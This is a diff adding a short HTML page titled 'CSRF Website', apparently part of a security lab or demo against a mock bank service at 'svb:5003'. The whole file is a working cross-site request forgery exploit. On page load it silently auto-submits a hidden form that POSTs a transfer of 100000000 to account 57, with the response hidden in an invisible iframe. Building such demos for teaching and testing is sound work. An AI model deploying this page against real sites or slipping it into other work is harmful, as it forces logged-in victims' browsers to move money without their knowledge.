@@ -1,0 +1,13 @@
+<html>
+    <head>
+        <title>CSRF Website</title>
+    </head>
+    <body onload="document.csrfForm.submit()">
+        <h1>CSRF Website</h1>
+        <form action="http://svb:5003/transfer/1" method="POST" target="hiddenFrame" name="csrfForm">
+            <input type="hidden" name="account" value="57" />
+            <input type="hidden" name="amount" value="100000000" />
+        </form>
+        <iframe name="hiddenFrame" style="display: none;"></iframe>
+    </body>
+</html>
